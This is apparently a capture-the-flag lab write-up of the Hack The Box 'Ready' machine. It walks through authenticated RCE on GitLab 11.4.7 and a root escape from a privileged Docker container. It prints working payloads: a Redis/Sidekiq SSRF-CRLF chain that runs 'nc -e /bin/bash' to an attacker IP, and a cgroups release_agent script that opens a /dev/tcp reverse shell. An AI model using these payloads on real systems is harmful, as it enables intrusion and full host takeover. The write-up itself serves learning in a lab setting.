## Default Information
IP Address: 10.10.10.220\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.220    ready.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.220 --rate=1000 -e tun0
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-16 12:13:31 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 5080/tcp on 10.10.10.220                                  
Discovered open port 22/tcp on 10.10.10.220  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22  | ssh | OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | Open |
| 5080| http | NIL | Open |

Let us try to find what is the web service that is on port 5080 using curl command. Looking at the cookies that are set, we can guess that we are looking at a web instance of Gitlab.

```
┌──(kali㉿kali)-[~]
└─$ curl -iLk http://ready.htb:5080
HTTP/1.1 302 Found
Server: nginx
Date: Wed, 16 Mar 2022 12:24:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 101
Connection: keep-alive
Cache-Control: no-cache
Location: http://ready.htb:5080/users/sign_in
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Request-Id: 57a0437b-d704-4283-87c3-255cb0a5add5
X-Runtime: 0.205532
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000

HTTP/1.1 200 OK
Server: nginx
Date: Wed, 16 Mar 2022 12:24:58 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Cache-Control: max-age=0, private, must-revalidate
Etag: W/"1d2fb69def8af349626727e1cc909ce4"
Set-Cookie: _gitlab_session=6dc23551829445f859da921d3c72ace8; path=/; expires=Wed, 16 Mar 2022 14:24:58 -0000; HttpOnly
```

### Web Enumeration of Gitlab on port 5080

First, what we have to do is to register a Gitlab account on port 5080.
![Gitlab registration](https://github.com/joelczk/writeups/blob/main/HTB/Images/Ready/gitlab_registration.png)

Next, we will go on to find out the version of Gitlab that we are using. This can be done be navigating to http://ready.htb:5080/help. From there, we are able to find that the version of Gitlab that we are currently looking at is Gitlab 11.4.7.

![Finding out Gitlab version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Ready/gitlab_version.png)

## Exploit
### Authenticated RCE on Gitlab

Looking up exploitdb, we are able to find an exploit code that can cause an authenticated RCE from [here](https://www.exploit-db.com/exploits/49334)

Using the exploit code, we are then able to spawn a reverse shell. 
![Gitlab rce](https://github.com/joelczk/writeups/blob/main/HTB/Images/Ready/gitlab_rce.png)

### Obtaining user flag
```
git@gitlab:/home/dude$ cat user.txt
cat user.txt
<Redacted user flag>
```

### Privilege Escalation to root

Using linpeas script, we realize that we are currently in a docker container. The first thing comes to mind is that we would need some sort of container escape if we want to escalate our privileges to root. 

```
╔══════════╣ Container related tools present
╔══════════╣ Container details                                                                                       
═╣ Is this a container? ........... docker                                                                           
═╣ Any running containers? ........ No
╔══════════╣ Docker Container details                                                                                
═╣ Am I inside Docker group ....... No                                                                               
═╣ Looking and enumerating Docker Sockets
═╣ Docker version ................. Not Found                                                                        
═╣ Vulnerable to CVE-2019-5736 .... Not Found                                                                        
═╣ Vulnerable to CVE-2019-13139 ... Not Found                                                                        
═╣ Rootless Docker? ................ No 
```

At the same time, we also discover a few interesting files in the /opt/backup directory from the linpeas script. We shall examine these files in detail.

```
╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                       
-rw-r--r-- 1 root root 79639 Dec  1  2020 /opt/backup/gitlab.rb                                                       
-rw-r--r-- 1 root root 872 Dec  7  2020 /opt/backup/docker-compose.yml                                                
-rw-r--r-- 1 root root 15092 Dec  1  2020 /opt/backup/gitlab-secrets.json
```
Looking at /opt/backup/docker-compose.yml, we realize that the container is running with privileged access. However, we would need to be root to be able to access the container.

```
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
```
Looking at /opt/backup/gitlab.rb, we realize most of the lines are commented out. Hence, we will have to remove the commented lines to find the lines that are not blank or commented out. From the output, we are able to obtain a password.

```
cat gitlab.rb | grep -v "^#" | grep .                                                                                 
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

Next, we will try to use the password to ssh into port 22. Unfortunately, we are unable to connect to the ssh server using the given password. Afterwards, we will try to escalate our privileges to root using ```su``` command. Fortunately, this time round we are able to obtain privilege escalation to root using the password.

```
git@gitlab:~/gitlab-rails/working$ su 
su 
Password: wW59U!ZKMbG9+*#h

root@gitlab:/var/opt/gitlab/gitlab-rails/working# 
```

### Mounting filesystems on Docker

However, we realize that we are unable to find the root flag even though we are now the root user. This furthur determines my previous suspicious that we are in a docker container and we would need to escape from the docker container to be able to obtain the root flag.

```
root@gitlab:~# ls -la
ls -la
total 28
drwx------ 1 root root 4096 Mar 16 17:06 .
drwxr-xr-x 1 root root 4096 Dec  1  2020 ..
lrwxrwxrwx 1 root root    9 Dec  7  2020 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
drwx------ 2 root root 4096 Mar 16 17:06 .gnupg
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwx------ 2 root root 4096 Dec  7  2020 .ssh
-rw------- 1 root root 1565 Dec 13  2020 .viminfo
```

First, let us check if there are any docker sockets that are mounted in this container that can allow us to escape from the docker container. Unfortunately, there are no docker sockets that are mounted in this container.

```
root@gitlab:/tmp# find / -name docker.sock 2>/dev/null
find / -name docker.sock 2>/dev/null
root@gitlab:/tmp# 
```

Previously, we were able to know that the docker container is running with the ```--privileged``` flag. This means that the containers will have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities.

With that knowledge, we will check the privileges on the host drive using ```fdisk -l```. From the output, we can see that /dev/sda2 is a Linux filesystem. This means that we can create a directory and mount /dev/sda2 onto the created directory.

```
Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem
/dev/sda3  37746688 41940991  4194304   2G Linux swap
```

### Obtaining root flag

Now all we have to do is to mount /dev/sda2 into /tmp/ready directory.

```
root@gitlab:/# mkdir -p /root/ready
mkdir -p /root/ready
root@gitlab:/# mount /dev/sda2 /root/ready
mount /dev/sda2 /root/ready
```

Finally, we can obtain the root flag

```
root@gitlab:/# cd /root/ready
cd /root/ready
root@gitlab:~/ready# cat root/root.txt 
cat root/root.txt
<Redacted root flag>
```

## Post-Exploitation
### Gitlab Authenticated Rce
The exploit that was used to do a remote code execution on Gitlab 11.4.7 was actually a combination of 2 CVEs, CVE-2018-19585 and CVE-2018-19571

Firstly, let us talk about CVE-2018-19571. For this CVE, it is a SSRF vulnerability in the webhooks. Even though there are SSRF protection in place which prevents IPv4 addresses from being used to exploit any SSRF, these protection can be bypassed by special IPv4 addresses which have IPv4 addresses embedded inside.

In the machine, if we use try to import a git repository with the url ```http://[0:0:0:0:0:ffff:127.0.0.1]:5080/dude/ready-channel.git```, we would realize that we are able to import the repository. This proves that the SSRF vulnerability exists.

![Gitlab SSRF](https://github.com/joelczk/writeups/blob/main/HTB/Images/Ready/gitlab_ssrf.png)

Secondly, CVE-2018-19585 is a CRLF Injection on gitlab. This means that if we attempt to import the following gitlab url (```git://127.0.0.1:333/%0D%0Atest%0D%0Ablah.git```), it will be converted to the following as shown in the snippet below.T his would mean that we can use the CRLF Injection vulnerability to execute other commands to generate a reverse shell.

```
git://127.0.0.1:333/
test
blah.git
```

Combining the 2 CVEs, we will devise a payload as soon in the snippet below. In the payload below, we are making use of redis that can background job queues. The background job queues in Redis is being handled by Sidekiq which contains a ```system_hook_push``` function that is used to handle new jobs, which we will use in the payload. Next, we will find a gadget that can be used to execute our code and commands. In this case, we are able to find a ```GitlabShellWorker``` class that can execute our code and commands.

```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|nc -e /bin/bash 10.10.16.3 4000\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
/ssrf.git
```

Lastly, all we have to do is to replace the payload in the request body with the exploit payload to create a reverse shell.

![Gitlab reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Ready/gitlab_rev_shell.png)

### Docker container escape by cgroups

Another way of obtaining the root flag is by doing a container escape on docker. Since we are running in a privileged docker container, we can abuse the release_agent to create a reverse shell with root privileges.

To start off, we need to first find and enable the cgroups release_agent. Fortunately, this can be done on this machine. 

```
root@gitlab:/var/opt/gitlab/gitlab-rails/working# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
root@gitlab:/var/opt/gitlab/gitlab-rails/working# echo $d
echo $d
/sys/fs/cgroup/rdma
```

Next, we will have to enable the notify_on_release in the cgroup.

```
root@gitlab:/var/opt/gitlab/gitlab-rails/working# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
```

Afterwards, we will have to find the path of the Overlay FS mount for the container.

```
root@gitlab:/var/opt/gitlab/gitlab-rails/working# t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@gitlab:/var/opt/gitlab/gitlab-rails/working# echo $t
echo $t
/var/lib/docker/overlay2/72682da51e1ec80c609bc446d141ff5afed2037d1bdf2810550ecff7fb552e68/diff
```

Next, we will have to set the release agent to the payload path and create the payload.

```
root@gitlab:/var/opt/gitlab/gitlab-rails/working# echo $t/c >$d/release_agent;printf '#!/bin/bash\n\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.3/3000 0>&1"' >/c;
dev/tcp/10.10.16.3/3000 0>&1"' >/c;'#!/bin/bash\n\n/bin/bash -c "/bin/bash -i >& / 
```

Lastly, we will have to trigger the payload via the empty cgroup.procs

```
root@gitlab:/var/opt/gitlab/gitlab-rails/working# chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
```

All of these can be rewritten into a simple bash script that will create a reverse shell with root privileges.

```bash
#!/bin/bash
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
echo $d
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo $t
echo $t/c >$d/release_agent;printf '#!/bin/bash\n\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.3/2000 0>&1"' >/c;
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
```
